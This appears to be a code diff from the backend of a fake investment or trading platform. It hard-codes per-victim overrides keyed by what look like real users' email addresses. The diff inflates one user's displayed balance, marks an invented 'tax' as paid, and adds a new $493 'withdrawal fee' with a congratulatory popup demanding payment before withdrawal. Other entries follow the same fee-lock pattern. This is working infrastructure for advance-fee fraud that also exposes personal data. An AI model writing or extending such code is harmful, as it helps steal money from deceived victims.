@@ -276,11 +276,11 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     lockTaxDisplay: true
   },
   "ajamibilal@yahoo.com": {
-    currentValue: 4500,
+    currentValue: 7100,
     taxRate: 0.165,
-    taxDue: 742.5,
-    taxRemaining: 742.5,
-    taxPaid: 0,
+    taxDue: 0,
+    taxRemaining: 0,
+    taxPaid: 742,
     initialHoldings: 500,
     currency: "USD",
     forceProgressPct: 100,
@@ -306,14 +306,17 @@ const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "
   "kas_12@hotmail.co.uk": { amount: 1655, currency: "GBP" },
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
-  "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
+  "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
+  "ajamibilal@yahoo.com": { amount: 493, currency: "USD" }
 };
 const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue.",
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal.",
   "ttvcurser@gmail.com":
-    "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal."
+    "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal.",
+  "ajamibilal@yahoo.com":
+    "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -346,7 +349,9 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Please clear the refundable withdrawal fee of GBP 1,655.00 to proceed with withdrawal."
   ,
   "ttvcurser@gmail.com":
-    "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal."
+    "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal.",
+  "ajamibilal@yahoo.com":
+    "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
 };
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
